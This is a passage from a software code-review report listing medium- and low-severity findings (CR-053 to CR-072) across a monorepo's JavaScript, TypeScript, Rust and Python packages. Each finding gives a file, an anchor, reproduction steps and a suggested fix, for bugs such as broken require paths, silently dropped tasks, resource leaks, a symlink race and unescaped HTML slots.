**File:** `packages/glass/test/manual/test-harness.js`
**Anchor:** `const path = require('path');`
**Severity:** medium

Independent of the path bug above, this file cannot be executed at all as
`node test-harness.js`, per its own documented usage
(`* Usage:\n *   node test-harness.js [iterations] [testUrl]`). `packages/glass/package.json`
sets `"type": "module"`, so a plain `.js` file is loaded as an ES module, and
`require` is not defined in that scope. Reproduced directly:

```
$ node packages/glass/test/manual/test-harness.js
ReferenceError: require is not defined in ES module scope, you can use import instead
```

The six sibling scripts in the same directory avoid this by using the
`.cjs` extension (which forces CommonJS regardless of the package's `"type"`
field); `test-harness.js` alone kept the `.js` extension from the import and
therefore hits both bugs. Fix: rename to `test-harness.cjs` (matching its
siblings) in addition to fixing the relative require path.

### CR-053: Manual Chrome test scripts require a relative path that only resolves from the package root, not from their own directory

**File:** `packages/glass/test/manual/test-issue-18-pid.cjs`
**Anchor:** `require('./skills/browsing/chrome-ws-lib.js').createSession()`
**Severity:** medium

Every script in `packages/glass/test/manual/` requires the library via
`require('./skills/browsing/chrome-ws-lib.js')`. That path is resolved relative
to each script's own directory (`packages/glass/test/manual/`), where no
`skills/` subdirectory exists — the real file lives two levels up, at
`packages/glass/skills/browsing/chrome-ws-lib.js`. Running any of these
scripts as documented in their own header comments fails immediately:

```
$ node packages/glass/test/manual/test-issue-18-pid.cjs
Error: Cannot find module './skills/browsing/chrome-ws-lib.js'
```

I reproduced this for `test-issue-18-pid.cjs`; the same string
(`require('./skills/browsing/chrome-ws-lib.js')`) appears verbatim in
`test-headless-toggle.cjs`, `test-issue-19-fullpage.cjs`,
`test-issue-20-hidpi.cjs`, `test-profiles.cjs`, and `test-xdg-cache.cjs`, so
all six fail the same way, plus `test-harness.js` (see the separate finding
below for that file's second, independent failure mode). `test-issue-19-fullpage.cjs`
also reads `fs.readFileSync('./skills/browsing/chrome-ws', 'utf8')` with the
same wrong depth. `git log --follow` shows these files entered the repo
unchanged in the wholesale import commit (`53cb5dc2 Import glass from
superpowers-chrome @782358e`); upstream's `test/manual/` was apparently a
sibling of `skills/` one level shallower, and the relative paths were never
adjusted for the new depth. None of this is caught by CI or `pnpm test` —
`vitest.config.ts` explicitly excludes `test/manual/**` — so the breakage is
silent. Fix: change each `./skills/browsing/...` reference to
`../../skills/browsing/...`.

### CR-054: jig plan seed silently drops topic words that coincide with the --entry value

**File:** `packages/jig-graph/src/jig-extension.ts`
**Anchor:** `const topic = args.filter((a) => !skipSet.has(a)).join(" ");`

**Severity:** medium

`seed.run` builds `skipSet` from the `--entry` flag and its value, then
filters `args` by *value* membership in that set to build the free-text
topic. Because the filter matches by value rather than by the specific
index consumed by `--entry`, any other argument token that happens to equal
the entry value is also removed — even though the user meant it as part of
the topic text, not as a second reference to the entry flag.

Reproduced directly:

```js
const args = ["--entry","foo.ts","describe","foo.ts","usage"];
// entry = "foo.ts"; skipSet = {"--entry","foo.ts"}
// topic = args.filter(a => !skipSet.has(a)).join(" ")
// => "describe usage"   (expected: "describe foo.ts usage")
```

For example `moe jig plan seed --entry index.ts refactor the index.ts loader`
silently produces the topic `"refactor the loader"`, dropping `index.ts` from
the middle of the sentence with no warning. Since `seedPlanSkeleton` uses this
string to drive `search_context` against the moedex graph, the corrupted
topic changes what the tool searches for without any indication to the user
that their input was altered. Fix: track and skip the specific index consumed
by `--entry` (e.g. `args.filter((a, i) => i !== entryIdx && i !== entryIdx + 1)`)
rather than filtering by value.

### CR-055: `loadExtensions` mangles multi-word CLI flags when forwarding to extension commands

**File:** `packages/jig/src/extension.ts`
**Anchor:** `loadExtensions`, the loop `for (const [k, v] of Object.entries(opts)) { if (v === true) flatArgs.push(`--${k}`); ... }`
**Severity:** medium

When an extension declares an option with a hyphenated flag (e.g. `{ flags: "--dry-run", ... }`), Commander parses it into a camelCased property (`opts.dryRun`). `loadExtensions` reconstructs a flat `args` array to hand to `ext.run(args, ctx)` by re-prefixing the *object key* with `--`, producing `--dryRun` instead of `--dry-run`. The extension's own `run()` implementation (which — per the documented contract in `jig-extension.ts` — parses `args` by looking for the literal flag string, e.g. `args.includes("--manifest")` or `args.indexOf("--entry")`) will never see the flag it declared.

Reproduced directly: registering an extension option `{ flags: "--dry-run", ... }` and invoking `plan seed topic --dry-run` through `loadExtensions` causes `run()` to receive `["topic", "--dryRun"]` — the literal `--dry-run` the user typed is gone, replaced by a string no extension author would check for.

This is currently latent because the one shipped extension (`@bubstack/moe-jig-graph`) only declares single-word flags (`--json`, `--manifest <path>`, `--entry <file>`), which happen to camelCase to themselves. But `JigExtensionCommand.options[].flags` accepts arbitrary Commander flag syntax and nothing in the type or docs restricts authors to single-word flags — a very ordinary extension option name (`--dry-run`, `--skip-cache`, `--check-phantoms`) will silently break. `extension.test.ts` never exercises `.action()`'s flag round-trip, only command registration, so this would not be caught by CI.

Fix: preserve the original flag string (e.g. capture `ext.options` flags mapped by their Commander-derived key before parsing) instead of re-deriving `--${camelCaseKey}`.

### CR-056: `computeWaves` silently drops tasks whose `depends_on` references an unknown task number

**File:** `packages/jig/src/parser.ts`
**Anchor:** `computeWaves`, the topological-sort loop `for (const t of tasks) { for (const d of t.dependsOn) { indeg.set(t.num, (indeg.get(t.num) ?? 0) + 1); adj.get(d)?.push(t.num); } }`
**Severity:** medium

Unlike `validatePlan` (which explicitly checks `known.has(d)` before trusting a `dependsOn` entry and reports `"not a known task"`), `computeWaves`'s Kahn's-algorithm setup increments `indeg` for task `t.num` for every entry in `t.dependsOn` unconditionally, but only pushes onto `adj.get(d)` when `d` is a task actually present in the input (`adj.get(d)?.push(...)` no-ops via optional chaining otherwise). If `d` doesn't correspond to any task in the list, that inflated in-degree unit is never satisfied, so the task never reaches `indeg === 0`, never enters the topological order `q`, and is **silently omitted from every wave** — with no error, warning, or log.

Reproduced directly:
```
Task 1: depends_on [99]   (99 does not exist)
Task 2: depends_on []
```
`computeWaves(tasks)` returns `[[2]]` — Task 1 has vanished entirely.

This is reachable in production: `validate.ts`'s Check 3 ("Wave conflicts") calls `ctx.computeWaves(schedulable)` directly on parsed tasks without first running `ctx.validatePlan` to catch a bad `depends_on` reference. Built a full repro through `validatePlanAgainstGraph` with a plan containing `Task 1: depends_on [99]` and `Task 2` whose files are graph-coupled to Task 1's files: the tool emits the `missing-edge` finding (Check 2, which iterates all task pairs regardless of schedulability) but the `wave-conflict` check (Check 3) never fires for this pair, because Task 1 disappeared from `waves` before the same-wave coupling check could run. A plan author who fixes the reported `missing-edge` in a way that still leaves the two tasks in the same wave would get no `wave-conflict` warning to catch it, purely because of the dangling reference in an unrelated task.

Fix: either have `computeWaves` treat an unknown `dependsOn` target as satisfied/ignored (matching `validatePlan`'s `if (!known.has(d)) continue;` pattern used in its own cycle-detection setup) and document the precondition, or have callers run `validatePlan` first and refuse to compute waves on an invalid plan.

### CR-057: `link_memories`/`trace_provenance` accept any `type` prefix with no runtime validation
**File:** `packages/memory/src/mcp-server.ts`
**Anchor:** `const sourceType = params.source.slice(0, sourceColon) as SourceType;`
**Severity:** medium

`LinkMemoriesInputSchema` only checks that `source`/`target` are strings of length ≥ 3; it does not constrain the `type` portion of the `type:id` string to the five declared `SourceType` values (`"exchange" | "journal" | "decision" | "finding" | "moedex_symbol"`, `types.ts`). The handler then does an unchecked TypeScript cast:

```ts
const sourceType = params.source.slice(0, sourceColon) as SourceType;
```

`as SourceType` is compile-time-only; nothing rejects `source: "anything:123"`. I checked `packages/memory/src/db.ts`'s schema (`source_type TEXT NOT NULL`, `target_type TEXT NOT NULL`) — there is no `CHECK` constraint enforcing the enum at the database layer either, so `insertEdge` will happily persist an edge with an arbitrary `source_type`/`target_type` string. `trace_provenance`'s `recordType = params.id.slice(0, colonIdx)` has the identical gap.

Since these tools are model-callable and the API contract advertised to the model (`inputSchema` description: `"e.g. 'exchange:abc123', 'journal:def456', 'decision:ghi789'"`) implies a closed set of types, a malformed or hallucinated `type:id` string silently corrupts the graph rather than erroring — `traceProvenance` walks `source_type`/`target_type` equality, so a typo'd type just becomes an unreachable island with no diagnostic. Add a zod `.refine()` (or a regex/enum check on the prefix) before constructing the edge, and consider a `CHECK` constraint in the schema as defense in depth.

### CR-058: `searchConversations` and other DB-opening helpers leak the SQLite handle on error
**File:** `packages/memory/src/search.ts`
**Anchor:** `const db = initDatabase();` in `searchConversations`
**Severity:** medium

`searchConversations` does `const db = initDatabase();` then performs vector search (which calls `await initEmbeddings()` — a network fetch/model load with its own documented timeout and failure mode in `embeddings.ts`) and DB queries, before an unconditional `db.close()` near the end of the function. There is no `try/finally`. If `initEmbeddings()` throws (model-load timeout, a corrupt/partial cache as `embeddings.ts`'s own error message anticipates, or any `db.prepare/.all()` failure), the function throws past `db.close()` and the `better-sqlite3` handle is never released.

This matters most because `searchConversations` is called directly from the `search_conversations` MCP tool handler in `mcp-server.ts`, which runs inside the **long-lived** MCP server process — every failed search leaks one more open native SQLite handle for the life of that server process (until it's eventually restarted). Repeated failures (e.g. while the embedding model cache is being repaired, which is exactly the scenario `embeddings.ts`'s timeout error message walks the operator through) compound file-descriptor/handle usage in a process that is not expected to be restarted per-request.

Contrast this with `stats.ts`'s `getIndexStats` and `journal-cli.ts`/`stats-cli.ts`, which correctly wrap their DB usage in `try { ... } finally { db.close(); }`. The identical gap (open `initDatabase()`, do fallible work, unconditional close with no `finally`) also exists in `sync.ts`'s `syncConversations` (around the `initEmbeddings()` call before its indexing loop) and `verify.ts`'s `verifyIndex` (the `db` opened at the top is only guaranteed to close if none of the un-guarded `fs.readdirSync`/`fs.statSync` calls in the project walk throw); those two are lower risk since they normally run inside short-lived CLI/hook processes that exit right after, but they are the same defect. Wrap each of these in `try/finally`.

### CR-059: Persistent "thinking budget" summarizer failure is silently accepted as the permanent summary
**File:** `packages/memory/src/summarizer.ts`
**Anchor:** `// If fallback also fails, return error message`

**Severity:** medium

In `callClaude`:

```ts
if (typeof result === "string" && result.includes("API Error") && result.includes("thinking.budget_tokens")) {
  if (!useFallback) {
    console.log(`    ${primaryModel} hit thinking budget error, retrying with ${fallbackModel}`);
    return await callClaude(prompt, sessionId, true, cwd);
  }
  // If fallback also fails, return error message
  return result;
}
```

When both the primary and fallback model hit this specific API error, `callClaude` returns the raw error string as if it were the model's output — it does not throw. `summarizeConversation` then runs it through `extractSummary()`, which finds no `<summary>` tags and falls back to `text.trim()`, returning the error text itself as "the summary." Every caller (`indexer.ts`, `sync.ts`, `verify.ts`'s `repairIndex`) treats a non-thrown return as success: it is written straight to `<archive>-summary.txt` with no error sentinel.

This defeats the error-sentinel mechanism the file's own comments describe as fixing "#96" (failed summarizations must be retryable, not silently permanent): `formatErrorSentinel`/`ERROR_MARKER` is only written from a `catch` block, and this path never throws, so `hasRealSummary()` sees ordinary non-empty text and treats it as a legitimate summary forever. A misconfigured `thinking.budget_tokens` setting (a persistent, not transient, condition — it will recur for every conversation processed while misconfigured) therefore poisons the search index with API-error text as the "summary" for every affected conversation, permanently, with no retry path and no operator-visible signal beyond one `console.log` on the first attempt (easy to miss during a large backfill). The fix is to throw (e.g. `throw new SummarizerSdkError(...)` or a dedicated error) in the fallback-also-failed branch instead of returning the error text as data.

### CR-060: Claude E2E harness leaks a real Codex-style temp directory that is never cleaned up

**File:** `packages/memory/test/manual/claude-e2e.js`
**Anchor:** `console.log(\`Claude E2E passed in ${root}\`);`
**Severity:** medium

`main()` creates `root = fs.mkdtempSync(path.join(os.tmpdir(), 'moe-memory-claude-e2e-'))` and
then writes into it for the whole run: `memoryDir` (the full conversation archive, embedding
database, and journal state), and `copiedProjectDir` — a literal `fs.copyFileSync` of the real
Claude session transcript (`seedTranscript`) produced by the harness's own seed prompt. Nothing
in this file ever removes `root`: there is no `rmSync`, no `try/finally`, and no cleanup on the
`main().catch(...)` failure path. On success the script's own last line prints the retained path
as if keeping it were the point.

This is the exact defect class documented and fixed for the sibling script in this same
directory: `codex-e2e-cleanup.test.ts`'s CR-077 comment describes `test/manual/codex-e2e.js`
before its fix in identical terms — "mkdtemp'd a root, copied ... into it, ... never removed it —
no try/finally, no cleanup on the failure path, and the success path printed the retained path as
though keeping it were the point" — and that file now wraps its body in `withTempRoot`, which
guarantees removal in a `finally` on both the resolve and reject path (confirmed by reading
`test/manual/codex-e2e.js`: `withTempRoot` at that file's `finally { fs.rmSync(root, { recursive:
true, force: true }); }`). `claude-e2e.js` was not given the same treatment.

The Codex version's original bug was rated a fixable defect worth a dedicated regression test
(CR-077) specifically because it copied a live credential (`auth.json`); this file does not copy
credentials, only a locally-generated transcript, a locally-generated conversation-index sqlite
database, and journal/summary text, all produced entirely by the harness's own controlled
prompts. That lowers the severity relative to CR-077, but the underlying resource-leak /
persisted-data defect is the same: every manual run of `npm run test:claude-e2e` leaves behind an
untracked directory in `$TMPDIR` containing a full copy of a live Claude Code session transcript,
database, and archive that is never reclaimed by the harness itself, indefinitely, with no cap and
no opt-out. `claude-e2e-script.test.ts` (the cheap guard on this harness) only asserts the
presence of specific string tokens in the script and would not catch a missing cleanup path,
mirroring exactly the gap `codex-e2e-cleanup.test.ts`'s doc comment calls out as unique to runtime
behavior ("a text match cannot see").

Fix: wrap `main()`'s body in the same `withTempRoot`-shaped guarantee used in
`test/manual/codex-e2e.js` (or extract the helper to a shared location both scripts import), so
the mkdtemp'd root is removed on both the success and throw paths.

### CR-061: agent-plugins-1.0 install doc falsely claims a custom skills path "will not be discovered"

**File:** `packages/mint/src/adapters/agent-plugins.ts`
**Anchor:** `The spec requires skills at the fixed \`skills/\` location; \`${config.components.skills}/\` will not be discovered.`
**Severity:** medium

`installDoc()`'s caveat branches on `config.components.skills !== 'skills'` and, when true, tells the plugin author that their skills directory "will not be discovered" by Agent Plugins 1.0 clients. This is false whenever generation actually runs: `generate.ts` calls `adapter.emit(adjustedModel(model, adapter.skillLayout))` for every adapter, and `adjustedModel` (`vocabulary.ts`) rewrites `config.components.skills` to the adapter's fixed `skillLayout.outputDir` (`'skills'` for agent-plugins-1.0) before `emit()` runs — so the adapter's own `emit()` never sees a non-`'skills'` value and the generated tree always materializes the plugin's skills at the fixed `skills/` root, regardless of the source `components.skills` setting. `docs-emit.ts`'s `emitDocs(model, ...)`, however, calls `installDoc(model)` with the un-adjusted base `model`, so `config.components.skills` there still holds the raw source-configured directory name (e.g. `my-skills`), and the caveat fires spuriously.

I reproduced this end-to-end with the project's own `generate()` entry point, copying `fixtures/kitchen-sink` and setting `components: { skills: my-skills }` (the same setup as the existing test "materializes custom source skills at root skills/ for Agent Plugins discovery" in `packages/mint/test/generate.test.ts`, just also reading the emitted markdown that test doesn't check):

- `result.skillDelivery['agent-plugins-1.0']` → `'native-discovery'` (achieved, not `'unsupported'`)
- `result.emissions['agent-plugins-1.0'].emittedCapabilities` → `['skill-discovery', 'mcp-registration', 'format-conformance']` — mint's own validated claim is that skill discovery *works*
- `skills/greeting/SKILL.md` and other skill files are physically present in the generated tree at the fixed `skills/` location
- yet `docs/install/agent-plugins-1.0.md` (generated in the same run) contains: "The spec requires skills at the fixed `skills/` location; `my-skills/` will not be discovered."

The generated install doc directly contradicts the tool's own capability/delivery validation for the same generation run, telling a plugin author their skills are broken for Agent Plugins 1.0 clients when they are not. The existing regression test (`generate.test.ts`, "materializes custom source skills…") only asserts against `result.emissions['agent-plugins-1.0'].limitations`, and the adjacent unit test in `test/adapters/agent-plugins.test.ts` ("does not report a false omission…") only asserts against `agentPlugins.emit(model).limitations` — both call `emit()` directly or check the wrong field, and `emit()` never produces this message (the `limitationForWarning` branch for `'agent-plugins-1.0 requires skills/'` is dead code, unreachable from `emit()`'s own logic), so neither test exercises the actual `installDoc()` text that ships to users.

Fix: either (a) have `docs-emit.ts` pass each adapter's `adjustedModel(model, adapter.skillLayout)` into `installDoc()` so it sees the same effective component paths `emit()` does, or (b) drop the caveat/branch in `agent-plugins.ts`'s `installDoc` entirely, since the tool always relocates skills to the fixed `skills/` root and the caveat can never be true in a real generation run.

### CR-062: TOCTOU between the marketplace/catalog symlink check and the write

**File:** `packages/mint/src/platform/projections.ts`
**Anchor:** `writeRegistryProjections`
**Severity:** medium

`validateDestination` goes out of its way to defend the two registry
projection targets (`.claude-plugin/marketplace.json` and
`docs/moe/generated/plugin-catalog.md`) against symlink redirection: it
resolves the real path of the containing directory and rejects it if it
escapes the repository, and separately `lstat`s the destination itself and
throws `PROJECTION_DESTINATION_ESCAPE` if it is already a symlink.

`writeRegistryProjections`, however, performs that check and then writes with
a plain, symlink-following `writeFile` from `node:fs/promises`:

```ts
const marketplacePath = await validateDestination(root, destinations.marketplacePath, '.claude-plugin/marketplace.json', 'marketplacePath')
...
await Promise.all([
  writeFile(marketplacePath, marketplace),
  writeFile(publicCatalogPath, catalog),
])
```

Between the `lstat` inside `validateDestination` and this later `writeFile`,
anything with write access to the destination directory (a concurrent build
step, a compromised dependency's postinstall, another job on a shared
runner) can replace the target with a symlink; `writeFile` will follow it and
write the marketplace/catalog content through to wherever the link points,
silently defeating the exact protection `validateDestination` was written to
provide. This is the same class of race the codebase already defends against
correctly elsewhere: `packages/mint/src/fileset.ts`'s `writeFileSet` opens
with `O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW` specifically to "close the
TOCTOU window between the containment checks above and this write" (its own
comment). `writeRegistryProjections` should use the same
open-with-`O_NOFOLLOW` pattern (or route through `writeFileSet`) instead of
`node:fs/promises`'s `writeFile`.

### CR-063: `does not use npm pack after candidate verification` test never executes its assertion

**File:** `packages/mint/test/release-workflows.test.ts`
**Anchor:** `it('does not use npm pack after candidate verification'`
**Severity:** medium

The test guards its only `expect(...)` call behind a lookup for an anchor string that no longer exists in the workflow it inspects:

```js
const publishMatrixLine = lines.findIndex((l) => l.includes('publish-matrix'))
if (publishMatrixLine >= 0) {
  const afterMatrix = lines.slice(publishMatrixLine).join('\n')
  expect(afterMatrix).not.toMatch(/npm pack(?!\s*#)/)
}
```

I verified `.github/workflows/publish.yml` contains no occurrence of the literal `publish-matrix` (`grep -n "publish-matrix" .github/workflows/publish.yml` returns nothing), and reproduced the lookup directly:

```
node -e '... lines.findIndex((l) => l.includes("publish-matrix")) ...'
=> publishMatrixLine index: -1
```

Because the index is always `-1` against the current workflow, the `if` body — the only place `expect` is called — never runs. The test reports green on every run regardless of what the workflow file contains, including if someone later reintroduces a raw `npm pack` invocation after the candidate-verification step (exactly the supply-chain-integrity regression this test's name claims to guard against). This is the "silent failure mode" pattern the repo's own `AGENTS.md` calls out (a stale anchor surviving a merge and reading as verified) — here the anchor is stale from the outset in this workflow file, not aged into staleness.

Fix: either assert unconditionally that `PUBLISH_WORKFLOW` never matches `/npm pack(?!\s*#)/` (since the whole publish path is now delegated to the compiled Mint CLI and no anchor is needed), or fail the test loudly when `publishMatrixLine === -1` instead of silently skipping the check.

### CR-064: `MOE_TAB_PRICING_DIR` override silently loses its "wins absolutely" contract for non-UTF-8 values

**File:** `packages/tab/crates/moe-tab-core/src/lib.rs`
**Anchor:** `resolve_store`, doc comment "Explicit MOE_TAB_PRICING_DIR wins absolutely"
**Severity:** medium

`resolve_store()` decides whether the explicit-override branch applies with
`std::env::var_os("MOE_TAB_PRICING_DIR").is_some()`, then — if true — loads
from `pricing::current_path()`, which internally (`pricing::store::pricing_dir`)
reads the *same* variable with `std::env::var(...)` (UTF-8 required) instead
of `var_os`. `env::var` returns `Err(VarError::NotUnicode(..))` whenever the
value isn't valid Unicode, while `env::var_os` returns `Some` regardless of
encoding — these are different, documented-different APIs. When
`MOE_TAB_PRICING_DIR` is set to a value containing invalid UTF-8 bytes (legal
at the OS level on Unix), `resolve_store()` believes the override applies and
unconditionally reports `PricingSource::Local`, but `pricing_dir()` silently
falls through to `$XDG_DATA_HOME/moe/tab` or `$HOME/.local/share/moe/tab` —
completely ignoring the directory the caller named, with no error, warning,
or difference in the reported `pricing_source`.

Verified directly against the real crate (not a re-implementation): built a
throwaway binary linking `moe-tab-core`, set `XDG_DATA_HOME` to an isolated
temp dir, then set `MOE_TAB_PRICING_DIR` to `OsStr::from_bytes(&[0x2f, 0xff,
0xfe, 0x2f, b'x'])` (an invalid-UTF-8 path) via `std::os::unix::ffi::OsStrExt`.
`std::env::var_os("MOE_TAB_PRICING_DIR").is_some()` returned `true` (the
override branch would be taken), but `moe_tab_core::pricing::current_path()`
resolved to the `XDG_DATA_HOME` fallback path, not anything derived from the
override value. `refresh_pricing_tables` would similarly write its snapshot
into that fallback directory while a caller who set the override (e.g. to
sandbox a test, or to point at a project-local cache) believes it is isolated
there — exactly the "leaking a fixture snapshot into the developer's REAL
~/.local/share/moe/tab" scenario the crate's own `test_env` module comment
warns about, but reachable here through a legitimate external input rather
than a test race. Fix: have `resolve_store()`'s presence check and
`pricing_dir()`'s value read agree — either both use `var_os`/`OsString`
throughout, or `resolve_store()` should surface a loud `InvalidAsOf`-style
error when the override variable is present but not valid UTF-8, rather than
silently taking a fallback path while claiming `PricingSource::Local`.

### CR-065: `execute_run` crashes with a raw TypeError when a task's prompt is a non-string YAML scalar

**File:** `py/proof/src/moe_proof/cli.py`
**Anchor:** `env["MOE_PROOF_PROMPT"] = task["prompt"]`
**Severity:** medium

Every other per-task/per-check value that becomes an env var is routed
through `scalar_env_vars`, which stringifies scalars before merging them
into `env`. The `prompt` value is the one exception: it is written straight
into the subprocess environment dict without going through `str()`. If a
task YAML happens to use an unquoted numeric scalar for the prompt (e.g.
`prompt: 42`, an easy authoring mistake since nothing declares `prompt` must
be quoted), `subprocess.run(..., env=env)` fails deep in `Popen` with an
unhandled `TypeError: expected str, bytes or os.PathLike object, not int`
instead of the `click.ClickException` pattern used for every other
known-bad-input case in this file (missing runner, missing config, missing
task, missing grader). Reproduced directly against `cli.run` via
`CliRunner.invoke(..., catch_exceptions=True)` with a task file containing
`{"name": "first", "prompt": 42}`; the run aborts with the traceback landing
in `subprocess.py:_execute_child` rather than any of `cli.py`'s error
handling.

Fix: `env["MOE_PROOF_PROMPT"] = str(task["prompt"])`.

### CR-066: A checker emitting a non-numeric `score` aborts the entire `grade` run with an unhandled ValueError

**File:** `py/proof/src/moe_proof/cli.py`
**Anchor:** `out["score"] = float(info["score"])` in `normalize_check_info`
**Severity:** medium

The checker contract documented directly above this function says checkers
own `score (float 0-1)`, but nothing validates that a checker actually
emitted a float-coercible value before `normalize_check_info` calls
`float(info["score"])`. A checker that emits `{"score": "N/A"}` — a
plausible mistake for anyone writing a custom checker, e.g. to signal "not
applicable" the same way it signals notes as a bare string — raises an
unhandled `ValueError: could not convert string to float: 'N/A'` inside
`grade_run`, called from the `grade` command's per-`run_file` loop, which has
no per-run try/except. The result is that one bad checker on one run aborts
grading for every run still to be processed in that invocation, in contrast
to the deliberate resilience shown elsewhere in the same function for a
non-executable checker (`execute_checker_program` catches that and returns
`(False, {"notes": ...})` instead of raising) and for non-JSON stdout
(caught with `json.JSONDecodeError` and folded into `details`).

Reproduced end-to-end: a custom checker script `echo '{"score": "N/A"}'`
wired into a grader's `checks`, run via `moe-proof run` then `moe-proof
grade` through `CliRunner`, raises exactly this `ValueError` out of
`grade_run` -> `normalize_check_info`, uncaught.

Fix: wrap the `float()` coercion in a try/except and demote an
unconvertible `score` to `details` (mirroring how unknown/extra keys are
already demoted), or fail just that one check with a `notes` message instead
of raising through the whole command.

### CR-067: `render_model_blocks` crashes `report` with an unhandled ValueError on a non-numeric metric value

**File:** `py/proof/src/moe_proof/cli.py`
**Anchor:** `display = mean_stderr([float(v) for v in values])`
**Severity:** medium

`normalize_check_info` only requires `metrics` to be a `dict`; it does not
constrain the *values* to `number|bool` despite the docstring's stated
contract ("metrics (dict of name -> number|bool)"), so a malformed or
malicious checker's metric value is written into `grade.yaml` unchanged.
When `report` later aggregates metrics per model/config group, any metric
key whose values are not uniformly `bool` falls into the `else` branch and
is blindly coerced with `float(v)`. A single non-numeric metric value (e.g.
`{"weird": "not-a-number"}`) makes `moe-proof report` raise an unhandled
`ValueError` instead of producing a report — reproduced directly by writing
a fabricated Grade with that metric via the `write_grade`/`write_run`
fixtures and invoking `report`, which raises out of `render_model_blocks`.
This is especially disruptive because `report` is meant to run over Grades
that may have been produced weeks earlier by a checker that has since been
edited or replaced — a single stale/bad metric value blocks reporting on
every other row too.

Fix: validate/coerce metric values defensively in `normalize_check_info` (or
skip/flag non-numeric, non-bool values in `render_model_blocks` rather than
crashing the whole report).

### CR-068: A task or config YAML missing a required key crashes with a raw KeyError instead of a ClickException

**File:** `py/proof/src/moe_proof/cli.py`
**Anchor:** `remaining[(task["name"], model)] = 1` in `run`
**Severity:** medium

`run` (and `execute_run`, `count_existing_runs`, `resolve_eval_slugs`)
assume every task doc has a `"name"` key and every config doc has `"runner"`
and `"model"` keys, indexing them directly (`task["name"]`,
`config["runner"]`, `config["model"]`) rather than validating up front the
way the file already validates the *existence* of the config/grader/task
files themselves (`load_grader`, the `config_path.exists()` check, the
runner-executable check). A hand-written task YAML that omits `name` (an
easy slip since `eval.yaml`'s `name` is optional via `.get("name") or
eval_path.name`, which sets an expectation that `name` fields are generally
forgiving) makes `run` fail with a bare `KeyError: 'name'` out of the
`remaining[...]` dict-comprehension setup, before a single Runner is
invoked, and before any of the file's other careful "no runs happened yet"
error messages fire. Reproduced directly: a task file `{"prompt": "hi"}`
(no `name`) and a config file `{"runner": "../run-llm", "model":
"test-model"}` (no `name`, which is fine — only `task["name"]` is actually
read) raises `KeyError: 'name'` from `cli.py`'s `run` command body when
invoked via `CliRunner`.

Fix: validate that each loaded task doc has a `name` (and each config has
`runner`/`model`) in `load_eval`/`load_yaml`-adjacent loading code, raising a
`click.ClickException` naming the offending file, consistent with every
other validation in this module.

### CR-069: `check-provenance.mjs` crashes with an uncaught exception instead of a diagnostic when `root` has no `plugins/` directory

**File:** `scripts/check-provenance.mjs`
**Anchor:** `checkPluginLicenses`
**Severity:** medium

The documented CLI contract is `usage: check-provenance.mjs [--json] [root]`,
and the tool's whole purpose (per `test-provenance-red.mjs`) is to be pointed
at arbitrary fixture roots and produce a controlled list of `diagnostics`
rather than crash. `countImportedWorks()` wraps its `readFileSync(NOTICE)` in
try/catch and turns a missing file into a `problems.push(...)` entry, but
`checkPluginLicenses()` calls `readdirSync(pluginsRoot, ...)` with no
try/catch. If `root` has no `plugins/` directory at all, this throws
synchronously inside `main()`, which is never caught anywhere, so the whole
process exits via an uncaught exception (stack trace on stderr, no JSON on
stdout) instead of a `LEGAL_PAYLOAD_MISSING`/similar diagnostic.

Reproduced directly:

```
$ node scripts/check-provenance.mjs --json /tmp/scratch/no-plugins-root
node:fs:1631
  const result = binding.readdir(...)
Error: ENOENT: no such file or directory, scandir '.../no-plugins-root/plugins'
    at checkPluginLicenses (file://.../scripts/check-provenance.mjs:102:23)
Node.js v24.19.0
```
(exit code 1, but stdout is empty rather than the JSON the `--json` contract
promises — any caller relying on `JSON.parse(stdout)`, as
`test-provenance-red.mjs` does for its own fixture, would instead throw
"Unexpected end of JSON input".)

Today's only fixture (`scripts/fixtures/provenance-red`) happens to include a
`plugins/` directory, so the existing self-test does not hit this path, but
any future fixture aimed at a different diagnostic (e.g. one that doesn't
need a `plugins/` tree) would silently break the self-test's ability to
assert on a specific diagnostic code. Wrap the `readdirSync` in
`checkPluginLicenses` in the same try/catch pattern used in
`countImportedWorks`, pushing a `problems` entry (e.g. `"plugins/ directory
not found"`) instead of throwing.

## Low

### CR-070: Exported harness-registry order/duplicate validator is dead code

**File:** `bin/lib/plugin-registry.mjs`
**Anchor:** `harnessRegistryProblems`
**Severity:** low

`harnessRegistryProblems(label, names)` is exported and implements a real
check (missing/extra/duplicate/out-of-order harness ids against the canonical
`HARNESS_IDS` list), but nothing in the tree calls it:

```
$ grep -rn "harnessRegistryProblems" --include="*.mjs" --include="*.js" --include="*.ts" .
bin/lib/plugin-registry.mjs   (only the definition)
```

`bin/lib/plugin-registry.mjs`'s own header comment frames this module as "the
canonical Moe plugin and host-harness registry," consumed by "pre-install bin
scripts and scripts/mint-plugins.mjs" — but `scripts/mint-plugins.mjs` only
imports `HARNESS_IDS` and `PLUGINS`, never this function, and neither
`bin/moe-doctor` nor `bin/moe-install` reference it either. If a future
registry (e.g., a generated marketplace.json, or another mint yaml) drifts
from `HARNESS_IDS` in name, order, or duplication, this function would have
caught it, but since nothing calls it, that drift would go undetected. Either
wire it into one of the "guarded surfaces" checks named in `AGENTS.md` (e.g.
alongside the `marketplace.json` bidirectional check), or remove it — as
written it is inert validation that looks load-bearing but is not.

### CR-071: render-html.cjs interpolates slot values into the HTML template without escaping

**File:** `packages/core/skills/_shared/render-html.cjs`
**Anchor:** `html = html.replaceAll(SENTINELS[slot], String(value));`
**Severity:** low

`renderTemplate` substitutes `title`, `nav`, `content`, and `scripts` from the
caller-supplied JSON directly into the HTML template with no HTML-escaping.
If any slot's value is ever derived from content that isn't fully
trusted/pre-sanitized markdown-to-HTML output (for instance a `title` built
from a file name or user-entered string), a value containing `<script>` or
event-handler attributes would execute when the generated report is opened in
a browser. Today's known callers appear to pass already-rendered HTML
fragments, so this is not demonstrated as reachable with attacker-controlled
input from this shard alone, but the function itself provides no defense in
depth — a future caller that passes a raw title string (e.g., taken from a
directory name) would silently become injectable. Consider escaping `title`
and `nav` (which are more likely to carry plain text than markup) or
documenting that all four slots must already be HTML-safe on input.

### CR-072: docs-verify-report.mjs suppresses the "No findings" heading only for Critical, inconsistently with High/Medium/Low

**File:** `packages/core/skills/docs-update/scripts/docs-verify-report.mjs`
**Anchor:** `if (group.length === 0 && sev === "critical") continue;`
**Severity:** low

When a severity group is empty, every severity except `critical` still emits
its `## <Severity>` heading followed by `No findings.`; an empty critical
group is skipped entirely (no heading at all). Nothing in the file explains
why critical is special-cased. The result is an inconsistent document: a
reader can't tell from the absence of `## Critical` whether it was
deliberately omitted (as designed here) or whether the report is truncated.
